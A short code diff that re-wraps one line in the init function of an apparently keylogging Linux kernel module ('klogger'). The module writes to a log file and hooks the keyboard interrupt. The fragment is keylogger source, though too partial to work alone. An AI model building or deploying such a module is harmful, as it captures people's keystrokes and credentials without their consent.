@@ -155,7 +155,8 @@ static int __init klogger_init(void)
 	snprintf(buf, sizeof(buf), "\n%lld", ktime_get_real_ns());
 	kernel_write(file, buf, strlen(buf), &log_offset);									
 	kernel_write(file, start, strlen(start), &log_offset);
-	return request_irq(KBD_IRQ, (irq_handler_t)handle_kbd_irq, IRQF_SHARED, DRIVER_NAME, &key_code);
+	return request_irq(KBD_IRQ, (irq_handler_t)handle_kbd_irq, IRQF_SHARED, 
+			DRIVER_NAME, &key_code);
 }
 
 static void __exit klogger_exit(void)
